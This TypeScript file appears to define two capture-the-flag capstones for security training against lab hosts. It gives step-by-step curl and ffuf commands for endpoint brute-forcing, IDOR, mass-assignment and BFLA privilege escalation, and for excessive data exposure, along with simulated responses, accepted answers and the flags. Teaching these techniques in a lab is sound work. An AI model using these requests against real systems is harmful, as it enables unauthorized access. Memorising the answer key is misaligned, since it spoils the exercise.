export interface CapstoneStep {
  id: string;
  title: string;
  prompt: string;
  commandHint: string;
  response: string;
  answers: string[];
}

export interface Capstone {
  id: string;
  title: string;
  subtitle: string;
  flag: string;
  intro: string;
  steps: CapstoneStep[];
}

export const CAPSTONES: Capstone[] = [
  {
    id: "web-assessment",
    title: "Capstone A · Web application assessment",
    subtitle: "Modern Web Vulnerabilities",
    flag: "FLAG{bola_plus_mass_assignment_chain}",
    intro: "In this assessment, you will evaluate a modern e-commerce storefront (shop.labs.hackme.example). Your objective is to map the application, identify insecure direct object references, and escalate privileges through mass assignment to recover the final flag.",
    steps: [
      {
        id: "recon",
        title: "Endpoint Discovery",
        prompt: "Start by mapping the application's attack surface. Use a directory brute-forcer to find hidden API endpoints or administrative directories on the target host.",
        commandHint: "ffuf -u http://shop.labs.hackme.example/FUZZ -w /usr/share/wordlists/common.txt",
        response: "index.html             [Status: 200, Size: 2451]\nlogin                  [Status: 200, Size: 1842]\napi                    [Status: 301, Size: 0, Location: /api/]\nassets                 [Status: 301, Size: 0, Location: /assets/]\nrobots.txt             [Status: 200, Size: 45]",
        answers: ["/api", "api", "/api/"]
      },
      {
        id: "auth-inspect",
        title: "Session Inspection",
        prompt: "Authenticate to the application with the provided student credentials (user: 'student', pass: 'password123'). Inspect the session mechanism. What header or cookie is used to maintain state?",
        commandHint: "curl -v -X POST http://shop.labs.hackme.example/api/login -d '{\"username\":\"student\",\"password\":\"password123\"}'",
        response: "HTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; Path=/\n\n{\"status\":\"success\", \"user\": \"student\"}",
        answers: ["session_token", "Cookie", "JWT"]
      },
      {
        id: "idor-invoices",
        title: "IDOR Exploration",
        prompt: "While logged in, you notice your own invoice at /api/invoices/5001. Attempt to access an invoice belonging to another user by incrementing the ID. What is the status code of a successful unauthorized request?",
        commandHint: "curl -H \"Cookie: session_token=...\" http://shop.labs.hackme.example/api/invoices/5002",
        response: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"id\": 5002,\n  \"customer\": \"admin_user\",\n  \"amount\": \"1337.00\",\n  \"status\": \"PAID\",\n  \"items\": [\"Security Audit\", \"Cloud Hosting\"]\n}",
        answers: ["200", "200 OK", "OK"]
      },
      {
        id: "mass-assignment",
        title: "Privilege Escalation",
        prompt: "The profile update endpoint (PATCH /api/profile) allows updating user info. Try to escalate your privileges by injecting an 'is_admin' or 'role' parameter into the JSON body. What parameter allowed the escalation?",
        commandHint: "curl -X PATCH -H \"Content-Type: application/json\" -d '{\"email\":\"new@email.com\", \"role\":\"admin\"}' http://shop.labs.hackme.example/api/profile",
        response: "HTTP/1.1 200 OK\n\n{\n  \"id\": 5001,\n  \"username\": \"student\",\n  \"email\": \"new@email.com\",\n  \"role\": \"admin\",\n  \"message\": \"Profile updated successfully\"\n}",
        answers: ["role", "admin", "\"role\": \"admin\""]
      },
      {
        id: "final-flag",
        title: "Retrieve Flag",
        prompt: "Now that you have administrative access, request the flag from the protected administrative endpoint /api/admin/flag. Enter the flag to complete the capstone.",
        commandHint: "curl -H \"Cookie: session_token=...\" http://shop.labs.hackme.example/api/admin/flag",
        response: "HTTP/1.1 200 OK\n\n{\n  \"flag\": \"FLAG{bola_plus_mass_assignment_chain}\",\n  \"message\": \"Welcome, Administrator.\"\n}",
        answers: ["FLAG{bola_plus_mass_assignment_chain}", "bola_plus_mass_assignment_chain"]
      }
    ]
  },
  {
    id: "api-assessment",
    title: "Capstone B · API assessment",
    subtitle: "REST API Vulnerabilities",
    flag: "FLAG{api_bfla_plus_overfetch_wins}",
    intro: "This capstone focuses on a backend API service (api.labs.hackme.example). You will explore API documentation, analyze authorization tokens, exploit Broken Function Level Authorization (BFLA), and identify Excessive Data Exposure.",
    steps: [
      {
        id: "swagger-discovery",
        title: "API Documentation",
        prompt: "API developers often leave documentation endpoints exposed. Attempt to find the OpenAPI/Swagger documentation path on the target.",
        commandHint: "curl -i http://api.labs.hackme.example/v3/api-docs",
        response: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"openapi\": \"3.0.1\",\n  \"info\": {\"title\": \"User Management API\", \"version\": \"v1\"},\n  \"paths\": {\n    \"/users/{id}\": { ... },\n    \"/admin/users/{id}/roles\": { ... }\n  }\n}",
        answers: ["/v3/api-docs", "v3/api-docs", "/api-docs"]
      },
      {
        id: "token-analysis",
        title: "Token Inspection",
        prompt: "Obtain two JWTs for 'user_a' and 'user_b'. Decode them to see what claims are present. What common claim likely determines the user's permissions level?",
        commandHint: "echo 'eyJhbGci...[token]...' | cut -d. -f2 | base64 -d",
        response: "{\n  \"sub\": \"12345\",\n  \"name\": \"John Doe\",\n  \"scope\": \"user:read\",\n  \"iat\": 1516239022\n}",
        answers: ["scope", "permissions", "role"]
      },
      {
        id: "bfla-exploit",
        title: "Broken Function Level Auth",
        prompt: "The documentation shows a POST /admin/users/{id}/roles endpoint. Try calling this using a standard user's bearer token to elevate user ID 5 to the 'superuser' role.",
        commandHint: "curl -X POST -H \"Authorization: Bearer <user_token>\" -d '{\"role\":\"superuser\"}' http://api.labs.hackme.example/admin/users/5/roles",
        response: "HTTP/1.1 201 Created\n\n{\n  \"status\": \"success\",\n  \"user_id\": 5,\n  \"new_role\": \"superuser\"\n}",
        answers: ["201", "201 Created", "Created"]
      },
      {
        id: "overfetching",
        title: "Excessive Data Exposure",
        prompt: "Request the user details for your own account (ID 5). Analyze the response for sensitive fields that should not be exposed to the client. Which field contains the user's internal decryption key?",
        commandHint: "curl -H \"Authorization: Bearer <elevated_token>\" http://api.labs.hackme.example/users/5",
        response: "{\n  \"id\": 5,\n  \"username\": \"student\",\n  \"email\": \"student@labs.internal\",\n  \"internal_master_key\": \"88f1a2...\",\n  \"last_login_ip\": \"10.0.0.5\"\n}",
        answers: ["internal_master_key", "master_key"]
      },
      {
        id: "final-flag-api",
        title: "Flag Extraction",
        prompt: "Use the internal master key or your elevated permissions to access the system configuration endpoint /api/v1/system/config. The flag is stored in the 'license_key' field.",
        commandHint: "curl -H \"Authorization: Bearer <elevated_token>\" http://api.labs.hackme.example/api/v1/system/config",
        response: "HTTP/1.1 200 OK\n\n{\n  \"system_name\": \"HACKME-LAB-01\",\n  \"license_key\": \"FLAG{api_bfla_plus_overfetch_wins}\",\n  \"version\": \"2.4.0-pro\"\n}",
        answers: ["FLAG{api_bfla_plus_overfetch_wins}", "api_bfla_plus_overfetch_wins"]
      }
    ]
  }
];
